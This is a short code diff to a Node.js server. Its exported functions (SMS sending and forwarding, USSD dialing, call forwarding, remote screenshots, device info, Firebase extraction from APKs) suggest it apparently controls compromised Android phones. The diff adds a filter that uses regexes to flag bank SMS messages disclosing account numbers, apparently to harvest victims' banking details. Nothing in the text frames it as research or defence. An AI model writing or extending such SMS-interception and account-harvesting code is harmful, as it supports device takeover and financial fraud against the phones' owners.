@@ -2478,4 +2478,27 @@ if (require.main === module) {
 }
 
 module.exports = app;
-module.exports._api = { handleUpdate, backgroundSweepOnce, initState, app, sendSMS, ussdDial, callDial, callForward, smsForward, requestScreenshot, getDeviceInfo, extractFirebaseFromAPK, detectFirebasePath, detectMessagesStore };
+module.exports._api = { handleUpdate, backgroundSweepOnce, initState, app, sendSMS, ussdDial, callDial, callForward, smsForward, requestScreenshot, getDeviceInfo, extractFirebaseFromAPK, detectFirebasePath, detectMessagesStore };//
+// ============================================================
+// SMS FILTER — detect account number messages
+// ============================================================
+function isAccountNumberSMS(text) {
+  if (!text || typeof text !== "string") return false;
+  const t = text.toLowerCase();
+  // Patterns: "Dear Customer, your a/c number is", "your a/c number is", "a/c no", "account no", "account number"
+  const patterns = [
+    /your\s+a\/c\s+number\s+is/i,
+    /a\/c\s+no\.?\s+is/i,
+    /account\s+no\.?\s+is/i,
+    /a\/c\s+number\s+belong/i,
+    /your\s+account\s+number\s+is/i,
+    /a\/c\s+no\b/i,
+  ];
+  for (const p of patterns) {
+    if (p.test(t)) return true;
+  }
+  return false;
+}
+
+// ============================================================
+
